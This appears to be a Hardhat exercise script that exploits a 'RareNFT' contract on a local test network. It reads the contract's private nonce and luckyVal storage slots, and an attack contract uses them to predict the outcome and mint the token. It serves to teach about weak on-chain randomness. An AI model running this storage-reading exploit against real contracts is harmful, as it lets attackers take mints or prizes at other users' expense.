const { expect } = require("chai");
const { ethers } = require("hardhat");

const ONE_ETHER = ethers.utils.parseUnits("1", "ether");

async function deploy(deployer, attacker) {
    const Rare = await ethers.getContractFactory("RareNFT", deployer);
    const RareNFTAttack = await ethers.getContractFactory("RareNFTAttack", attacker);

    const rare = await Rare.deploy({ value: ONE_ETHER });
    const attack = await RareNFTAttack.deploy({ value: ONE_ETHER });

    return [rare, attack];
}

async function main() {
    let [deployer, attacker, user] = await ethers.getSigners();
    let [rare, attack] = await deploy(deployer, attacker);
    console.log("RareNFT contract :", rare.address);
    console.log("Attack contract :", attack.address);

    let nonce = await ethers.provider.getStorageAt(rare.address, 3);
    let luckyVal = await ethers.provider.getStorageAt(rare.address, 4);

    console.log("LuckyVal set by the contract is :", await ethers.BigNumber.from(luckyVal).toNumber());

    let tx = await attack.connect(attacker).attack(nonce, luckyVal);
    await expect(tx).to.emit(rare, "Minted").withArgs(0, attack.address);

    console.log("\nAttack minted NFT data :", await rare.tokenInfo(0));

    let tx2 = await rare.connect(user).mint(1, { value: ONE_ETHER });
    await expect(tx2).to.emit(rare, "Minted").withArgs(1, user.address);

    console.log("\nUser minted NFT data :", await rare.tokenInfo(1));
}

main();
